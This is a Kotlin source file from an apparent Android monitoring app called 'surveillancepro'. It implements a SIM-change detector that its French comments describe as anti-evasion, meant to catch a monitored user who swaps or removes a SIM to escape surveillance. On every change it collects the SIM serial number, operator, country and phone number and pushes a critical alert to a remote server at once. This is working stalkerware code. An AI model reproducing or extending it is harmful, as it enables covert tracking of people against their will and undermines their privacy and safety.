package com.surveillancepro.android.services

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.workers.SyncWorker
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Détecteur de changement de carte SIM - SANS ROOT
 * 
 * ANTI-ÉVASION: Détecte si l'utilisateur change de SIM pour
 * essayer d'échapper à la surveillance.
 * 
 * FONCTIONNALITÉS:
 * 1. Détecte le changement de SIM
 * 2. Détecte le retrait de SIM
 * 3. Détecte l'ajout d'une nouvelle SIM
 * 4. Envoie une alerte IMMÉDIATE au serveur
 * 5. Capture les infos de la nouvelle SIM
 * 
 * MÉTHODE SANS ROOT:
 * - TelephonyManager pour lire les infos SIM
 * - BroadcastReceiver pour ACTION_SIM_STATE_CHANGED
 * - SubscriptionManager pour les infos détaillées
 */
object SimChangeDetector {
    
    private const val TAG = "SimChangeDetector"
    
    private var lastSimSerialNumber: String? = null
    private var lastSimOperator: String? = null
    private var lastSimCountry: String? = null
    private var isInitialized = false
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Initialise le détecteur avec les infos SIM actuelles.
     * Appelé au démarrage de l'app.
     */
    fun initialize(context: Context) {
        if (isInitialized) return
        
        val storage = DeviceStorage.getInstance(context)
        
        // Charger les dernières infos SIM connues
        lastSimSerialNumber = storage.prefs.getString("last_sim_serial", null)
        lastSimOperator = storage.prefs.getString("last_sim_operator", null)
        lastSimCountry = storage.prefs.getString("last_sim_country", null)
        
        // Lire les infos SIM actuelles
        val currentSimInfo = getSimInfo(context)
        
        if (lastSimSerialNumber == null) {
            // Première initialisation - sauvegarder les infos actuelles
            saveSimInfo(context, currentSimInfo)
        } else if (currentSimInfo.serialNumber != lastSimSerialNumber) {
            // SIM différente détectée!
            onSimChanged(context, currentSimInfo)
        }
        
        isInitialized = true
        Log.d(TAG, "SimChangeDetector initialized")
    }
    
    /**
     * Vérifie si la SIM a changé.
     * Appelé périodiquement par le WatchdogService.
     */
    fun checkSimChange(context: Context) {
        val currentSimInfo = getSimInfo(context)
        
        // Vérifier si la SIM a changé
        if (lastSimSerialNumber != null && currentSimInfo.serialNumber != lastSimSerialNumber) {
            onSimChanged(context, currentSimInfo)
        }
        
        // Vérifier si la SIM a été retirée
        if (currentSimInfo.state == "ABSENT" && lastSimSerialNumber != null) {
            onSimRemoved(context)
        }
    }
    
    /**
     * Appelé quand un changement de SIM est détecté.
     */
    private fun onSimChanged(context: Context, newSimInfo: SimInfo) {
        val queue = EventQueue.getInstance(context)
        
        Log.w(TAG, "SIM CHANGE DETECTED!")
        
        // Envoyer une alerte critique
        queue.enqueue("sim_change_alert", mapOf(
            "alertType" to "sim_changed",
            "severity" to "critical",
            "previousSerial" to (lastSimSerialNumber ?: "unknown"),
            "previousOperator" to (lastSimOperator ?: "unknown"),
            "previousCountry" to (lastSimCountry ?: "unknown"),
            "newSerial" to (newSimInfo.serialNumber ?: "unknown"),
            "newOperator" to (newSimInfo.operatorName ?: "unknown"),
            "newCountry" to (newSimInfo.countryIso ?: "unknown"),
            "newPhoneNumber" to (newSimInfo.phoneNumber ?: "unknown"),
            "timestamp" to dateFormat.format(Date()),
        ))
        
        // Sync immédiat pour envoyer l'alerte
        SyncWorker.triggerNow(context)
        
        // Sauvegarder les nouvelles infos
        saveSimInfo(context, newSimInfo)
    }
    
    /**
     * Appelé quand la SIM est retirée.
     */
    private fun onSimRemoved(context: Context) {
        val queue = EventQueue.getInstance(context)
        
        Log.w(TAG, "SIM REMOVED!")
        
        queue.enqueue("sim_change_alert", mapOf(
            "alertType" to "sim_removed",
            "severity" to "critical",
            "previousSerial" to (lastSimSerialNumber ?: "unknown"),
            "previousOperator" to (lastSimOperator ?: "unknown"),
            "timestamp" to dateFormat.format(Date()),
        ))
        
        SyncWorker.triggerNow(context)
    }
    
    /**
     * Lit les informations de la SIM actuelle.
     */
    private fun getSimInfo(context: Context): SimInfo {
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        
        return try {
            val hasPermission = ContextCompat.checkSelfPermission(
                context, Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED
            
            SimInfo(
                state = when (tm.simState) {
                    TelephonyManager.SIM_STATE_ABSENT -> "ABSENT"
                    TelephonyManager.SIM_STATE_READY -> "READY"
                    TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN_REQUIRED"
                    TelephonyManager.SIM_STATE_PUK_REQUIRED -> "PUK_REQUIRED"
                    TelephonyManager.SIM_STATE_NETWORK_LOCKED -> "NETWORK_LOCKED"
                    else -> "UNKNOWN"
                },
                serialNumber = if (hasPermission) {
                    try {
                        @Suppress("DEPRECATION")
                        tm.simSerialNumber
                    } catch (_: Exception) { null }
                } else null,
                operatorName = tm.simOperatorName,
                operatorCode = tm.simOperator,
                countryIso = tm.simCountryIso,
                phoneNumber = if (hasPermission) {
                    try {
                        @Suppress("DEPRECATION")
                        tm.line1Number
                    } catch (_: Exception) { null }
                } else null,
                networkOperator = tm.networkOperatorName,
                networkType = getNetworkTypeName(tm),
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get SIM info: ${e.message}")
            SimInfo(state = "ERROR")
        }
    }
    
    /**
     * Obtient le nom du type de réseau.
     */
    private fun getNetworkTypeName(tm: TelephonyManager): String {
        return try {
            when (tm.dataNetworkType) {
                TelephonyManager.NETWORK_TYPE_LTE -> "4G LTE"
                TelephonyManager.NETWORK_TYPE_NR -> "5G"
                TelephonyManager.NETWORK_TYPE_HSDPA,
                TelephonyManager.NETWORK_TYPE_HSUPA,
                TelephonyManager.NETWORK_TYPE_HSPA,
                TelephonyManager.NETWORK_TYPE_HSPAP -> "3G HSPA"
                TelephonyManager.NETWORK_TYPE_UMTS -> "3G UMTS"
                TelephonyManager.NETWORK_TYPE_EDGE -> "2G EDGE"
                TelephonyManager.NETWORK_TYPE_GPRS -> "2G GPRS"
                else -> "Unknown"
            }
        } catch (_: Exception) { "Unknown" }
    }
    
    /**
     * Sauvegarde les infos SIM actuelles.
     */
    private fun saveSimInfo(context: Context, simInfo: SimInfo) {
        val storage = DeviceStorage.getInstance(context)
        storage.prefs.edit()
            .putString("last_sim_serial", simInfo.serialNumber)
            .putString("last_sim_operator", simInfo.operatorName)
            .putString("last_sim_country", simInfo.countryIso)
            .apply()
        
        lastSimSerialNumber = simInfo.serialNumber
        lastSimOperator = simInfo.operatorName
        lastSimCountry = simInfo.countryIso
    }
    
    /**
     * Retourne les infos SIM actuelles pour affichage.
     */
    fun getCurrentSimInfo(context: Context): Map<String, Any?> {
        val info = getSimInfo(context)
        return mapOf(
            "state" to info.state,
            "operator" to info.operatorName,
            "country" to info.countryIso,
            "networkType" to info.networkType,
            "phoneNumber" to info.phoneNumber,
        )
    }
    
    data class SimInfo(
        val state: String,
        val serialNumber: String? = null,
        val operatorName: String? = null,
        val operatorCode: String? = null,
        val countryIso: String? = null,
        val phoneNumber: String? = null,
        val networkOperator: String? = null,
        val networkType: String? = null,
    )
}

/**
 * BroadcastReceiver pour les changements d'état SIM.
 * Doit être déclaré dans AndroidManifest.xml.
 */
class SimStateReceiver : BroadcastReceiver() {
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.intent.action.SIM_STATE_CHANGED") {
            Log.d("SimStateReceiver", "SIM state changed")
            SimChangeDetector.checkSimChange(context)
        }
    }
}
